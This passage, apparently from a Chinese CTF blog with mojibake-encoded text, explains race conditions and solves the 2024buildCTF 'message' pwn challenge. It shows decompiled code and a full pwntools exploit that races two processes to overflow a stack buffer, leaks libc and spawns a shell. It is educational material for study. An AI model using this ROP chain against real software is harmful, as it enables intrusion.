æ—¶ï¼Œè¿™éƒ¨åˆ†åº”è¯¥åŠ é”ã€‚</li><li>æ”¹å˜å¯¹è±¡ï¼Œå³è‡³å°‘æœ‰ä¸€ä¸ªæ§åˆ¶æµä¼šæ”¹å˜ç«äº‰å¯¹è±¡çš„çŠ¶æ€ã€‚å› ä¸ºå¦‚æœç¨‹åºåªæ˜¯å¯¹å¯¹è±¡è¿›è¡Œè¯»æ“ä½œï¼Œé‚£ä¹ˆå¹¶ä¸ä¼šäº§ç”Ÿæ¡ä»¶ç«äº‰ã€‚</li></ul></blockquote><h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä»£ç æ‘˜è‡ªctf.wiki</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> counter;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">IncreaseCounter</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">  counter += <span class="number">1</span>;</span><br><span class="line">  sleep(<span class="number">0.1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thread %d has counter value %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)pthread_self(),</span><br><span class="line">         counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">pthread_t</span> p[<span class="number">10</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    pthread_create(&amp;p[i], <span class="literal">NULL</span>, IncreaseCounter, <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    pthread_join(p[i], <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>è¿™ä¸ªç¨‹åºä½¿ç”¨ POSIX çº¿ç¨‹ï¼ˆ<code>pthread</code>ï¼‰åº“åˆ›å»ºäº† 10 ä¸ªçº¿ç¨‹ï¼Œå¹¶è®©æ¯ä¸ªçº¿ç¨‹æ‰§è¡Œ <code>IncreaseCounter</code> å‡½æ•°ã€‚ä»£ç çš„ç›®çš„æ˜¯é€šè¿‡çº¿ç¨‹æ¥å¢åŠ ä¸€ä¸ªå…±äº«å˜é‡ <code>counter</code> çš„å€¼å¹¶æ‰“å°æ¯ä¸ªçº¿ç¨‹çš„ ID åŠ <code>counter</code> çš„å½“å‰å€¼ã€‚</li><li>æˆ‘ä»¬é¢„æœŸçš„è¾“å‡ºåº”è¯¥æ˜¯æ¯ä¸ªçº¿ç¨‹<code>conunter+1</code>ï¼Œå³ï¼š</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thread .. has counter value <span class="number">1</span></span><br><span class="line">Thread .. has counter value <span class="number">2</span></span><br><span class="line">Thread .. has counter value <span class="number">3</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><ul><li>ä½†æ˜¯å®é™…çš„è¾“å‡ºå´ä¸å°½å¦‚äººæ„:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241106200906830.bmp"></p><ul><li>ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™æ ·çš„è¾“å‡ºå‘¢ï¼Ÿ</li></ul><p><code>counter</code>ä½œä¸ºä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä½†æ˜¯å´åœ¨å¤šä¸ªçº¿ç¨‹ä¹‹é—´+1ï¼Œè¿™æ ·ä¼šå¯¼è‡´æ¡ä»¶ç«äº‰ï¼Œä½¿å¾—å¤šä¸ªçº¿ç¨‹åœ¨æ²¡æœ‰åŒæ­¥çš„æƒ…å†µä¸‹å¯¹<code>counter</code>è¿›è¡Œè¯»å†™ï¼Œä»è€Œå¯¼è‡´<code>counter</code>å‡ºé”™ã€‚</p><p><mark>æ›´åŠ è¯¦ç»†çš„å‚è€ƒå¼€å¤´çš„æ–‡ç« <mark></mark></mark></p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><ul><li><code>2024buildCTF-message</code></li></ul><p>å‚è€ƒæ–‡ç« :<a class="link" href="https://blog.csdn.net/weixin_52640415/article/details/143349375?spm=1001.2014.3001.5502">stoneç¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="idaæŸ¥çœ‹"><a href="#idaæŸ¥çœ‹" class="headerlink" title="idaæŸ¥çœ‹"></a>idaæŸ¥çœ‹</h2><ul><li><code>ä¸»è¦éƒ¨åˆ†</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  my_init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">2uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi((<span class="type">const</span> <span class="type">char</span> *)&amp;buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add_message(&amp;v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit_message(&amp;v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        view_message(&amp;v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        delete_message(&amp;v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        buy_BTC();</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>åœ¨initå‡½æ•°é‡Œé¢çš„<code>clear_file</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">clear_file</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;message.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;File &#x27;%s&#x27; has been cleared.\n&quot;</span>, <span class="string">&quot;message.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><code>add_message</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FILE *__fastcall <span class="title function_">add_message</span><span class="params">(FILE **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *a1 = fopen(<span class="string">&quot;message.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">  result = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><code>edit_message</code></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">edit_message</span><span class="params">(FILE **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You should add message first&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Message file detected&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  clear_file();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now please leave your message :&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x50</span>uLL);</span><br><span class="line">  fwrite(s, <span class="number">1uLL</span>, <span class="number">0x50</span>uLL, *a1);</span><br><span class="line">  <span class="keyword">return</span> fflush(*a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><code>view_message</code></li><li><mark>ä¸¤ç§’æ£€æŸ¥ä¸€æ¬¡<mark></mark></mark></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">view_message</span><span class="params">(FILE **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !*a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You should add message first&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  fseek(*a1, <span class="number">0LL</span>, <span class="number">2</span>);</span><br><span class="line">  n = ftell(*a1);</span><br><span class="line">  fseek(*a1, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">  fread(s, <span class="number">1uLL</span>, n, *a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><h6 id="ftell"><a href="#ftell" class="headerlink" title="ftell"></a><code>ftell</code></h6><p><code>ftell</code> ç”¨äºè·å–æ–‡ä»¶æŒ‡é’ˆåœ¨æ–‡ä»¶ä¸­çš„å½“å‰ä½ç½®ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½è¿”å›ä½ç½®ã€‚</p><p>&gt;&gt;&gt;æ–‡ä»¶æŒ‡é’ˆè·ç¦»æ–‡ä»¶å¼€å¤´çš„è·ç¦»</p><h6 id="fseek"><a href="#fseek" class="headerlink" title="fseek"></a><code>fseek</code></h6><p><code>fseek</code> ç”¨äºåœ¨æ–‡ä»¶ä¸­ç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆï¼Œå…è®¸ä»æ–‡ä»¶çš„æŒ‡å®šä½ç½®å¼€å§‹è¯»å–æˆ–å†™å…¥æ•°æ®ã€‚</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fseek</span><span class="params">(FILE *stream, <span class="type">long</span> <span class="type">int</span> offset, <span class="type">int</span> whence)</span>;</span><br><span class="line">&gt;&gt;&gt; fseek(*a1, <span class="number">0LL</span>, <span class="number">2</span>);<span class="comment">// è¡¨ç¤ºç§»åŠ¨åˆ°ç»“å°¾</span></span><br></pre></td></tr></table></figure></div></blockquote><ul><li>ä¸»è¦ç”¨åˆ°çš„å°±ä¸Šé¢å‡ ä¸ªæ¨¡å—</li></ul><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æ¼æ´ç‚¹å°±å‡ºç°åœ¨<code>edit_message</code>ä¹‹ä¸­ï¼Œ2ç§’ä¹‹åæ‰ä¼šæ‰§è¡Œclear_fileï¼Œåœ¨è¿™ä¹‹é—´æˆ‘ä»¬å¯ä»¥å¼€å¯ä¸¤ä¸ªçº¿ç¨‹ï¼Œç¬¬ä¸€ä¸ªéšä¾¿å†™ï¼Œç¬¬äºŒä¸ªè¿›ç¨‹å†™å…¥ROPï¼ŒROPçš„æ‰§è¡Œç‚¹å°±åœ¨<code>view_message</code>ä¹‹ä¸­ï¼Œç”±äºæˆ‘ä»¬ä¸¤æ¬¡è¿›ç¨‹å†™å…¥åŒä¸€ä¸ªå…±äº«èµ„æº<code>message.txt</code>ä¸­ï¼Œè™½ç„¶æ¯æ¬¡åªè§„å®šå†™0x50,ä½†æ˜¯ä¸¤ä¸ªè¿›ç¨‹å¯ä»¥å†™å…¥0x100,ä¼šé€ æˆ<code>view_message</code>ä¸­æ ˆæº¢å‡º</p><p>å¯ä»¥ç¬¬ä¸€ä¸ªè¿›ç¨‹å†™å…¥0x50çš„åƒåœ¾æ•°æ®ï¼Œç„¶åç¬¬äºŒä¸ªè¿›ç¨‹å†è¡¥0x28çš„åƒåœ¾æ•°æ®ï¼Œç„¶åå°±æ˜¯æ­£å¸¸çš„ret2libcäº†</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"><span class="comment">#libc = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = process(file)</span><br><span class="line">p2 = process(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å¯åŒçº¿ç¨‹</span></span><br><span class="line">add(p1)</span><br><span class="line">add(p2)</span><br><span class="line"></span><br><span class="line">edit(p1)</span><br><span class="line">edit(p2)</span><br><span class="line">sleep(<span class="number">1.2</span>)</span><br><span class="line">p1.sendafter(<span class="string">&quot;Now please leave your message :&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>) </span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004019b3</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p2.sendafter(<span class="string">&quot;Now please leave your message :&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">show(p2)</span><br><span class="line">p2.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(p2.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_address: &quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒæ ·çš„æ­¥éª¤</span></span><br><span class="line">add(p2)</span><br><span class="line">edit(p1)</span><br><span class="line">edit(p2)</span><br><span class="line">sleep(<span class="number">1.2</span>)</span><br><span class="line">p1.sendafter(<span class="string">&quot;Now please leave your message :&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>) </span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload += flat(pop_rdi_ret , bin_sh ,ret, system)</span><br><span class="line">p2.sendafter(<span class="string">&quot;Now please leave your message :&quot;</span>,payload)</span><br><span class="line">show(p2)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p2.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p2.interactive()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241106215502390.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc2.27_setcontext+orw</title>
      <link href="/2024/11/04/Glibc2-27-setcontext-orw/"/>
      <url>/2024/11/04/Glibc2-27-setcontext-orw/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>å‚è€ƒæ–‡ç« ï¼š<a class="link" href="https://blog.wingszeng.top/pwn-glibc-setcontext/">https://blog.wingszeng.top/pwn-glibc-setcontext/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>åœ¨glibc2.27åŠä¹‹ä¸‹ï¼Œé‡åˆ°å †é¢˜ç›®å¼€å¯äº†æ²™ç®±ï¼Œé€šå¸¸æ˜¯ä½¿ç”¨<code>setcontext+53 srop orw</code>å»è¾¾åˆ°è·å¾—flagï¼Œä¸‹é¢ä¾¿ä»‹ç»ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ã€‚</p><h2 id="setcontextçš„å®ç°"><a href="#setcontextçš„å®ç°" class="headerlink" title="setcontextçš„å®ç°"></a><code>setcontext</code>çš„å®ç°</h2><p><img lazyload src="/images/loading.svg" 